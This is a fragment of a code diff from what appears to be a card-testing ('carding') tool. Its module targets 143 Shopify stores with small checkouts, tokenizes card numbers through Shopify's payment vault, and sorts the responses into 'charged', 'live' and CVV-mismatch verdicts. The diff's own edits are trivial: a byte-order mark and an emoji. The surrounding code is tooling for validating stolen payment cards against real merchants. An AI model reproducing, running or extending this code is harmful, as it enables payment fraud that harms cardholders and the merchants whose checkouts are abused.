@@ -1,4 +1,4 @@
-﻿"""
+"""
 Shopify GraphQL & Classic One-Page Checkout Gate Module (/sh)
 Target Pool: 143 Verified Shopify Targets (< $20 Cap)
 Tokenization via deposit.us.shopifycs.com Vault + Headless GraphQL Checkout.
@@ -200,7 +200,7 @@ async def check_card_shopify(
 
             # Step 6: Parse verdict
             if "THANK YOU" in resp_upper or "ORDER CONFIRMATION" in resp_upper or "ORDER-RECEIVED" in resp_upper or "/THANK_YOU" in str(r_pay.url).upper():
-                return "charged", f"Charged! 🟢 -» ${price_str}", brand
+                return "charged", f"Charged! ✅ -» ${price_str}", brand
             elif "INSUFFICIENT" in resp_upper or "FUNDS" in resp_upper:
                 return "live", "Insufficient Funds (Card Live)", brand
             elif any(k in resp_upper for k in ["CVV", "CVC", "SECURITY CODE", "INCORRECT_CVC", "CARD_CODE"]):
